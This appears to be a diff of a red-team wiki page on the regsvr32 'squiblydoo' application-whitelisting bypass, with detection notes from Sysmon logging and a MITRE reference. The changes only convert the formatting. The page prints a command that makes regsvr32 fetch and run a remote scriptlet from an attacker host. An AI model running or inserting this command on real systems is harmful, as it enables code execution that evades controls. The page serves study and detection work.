@@ -1,13 +1,14 @@
 ---
 description: regsvr32 (squiblydoo) code execution - bypass application whitelisting.
+tags: [#code-execution]
 ---
 
 # regsvr32
 
 ## Execution
 
-{% code title="http://10.0.0.5/back.sct" %}
 ```markup
+// http://10.0.0.5/back.sct
 <?XML version="1.0"?>
 <scriptlet>
 <registration
@@ -21,28 +22,26 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 </registration>
 </scriptlet>
 ```
-{% endcode %}
 
 We need to host the back.sct on a web server so we can invoke it like so:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 ```
-{% endcode %}
 
 ## Observations
 
-![calc.exe spawned by regsvr32.exe](../../.gitbook/assets/regsvr32.png)
+![[regsvr32.png|calc.exe spawned by regsvr32.exe]]
 
 Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:
 
-![](<../../.gitbook/assets/regsvr32-commandline (1).png>)
+![[regsvr32-commandline (1).png]]
 
 Additionally, of course sysmon will show regsvr32 establishing a network connection:
 
-![](../../.gitbook/assets/regsvr32-network.png)
+![[regsvr32-network.png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1117" %}
+[attack.mitre.org/wiki/Technique/T1117](https://attack.mitre.org/wiki/Technique/T1117)
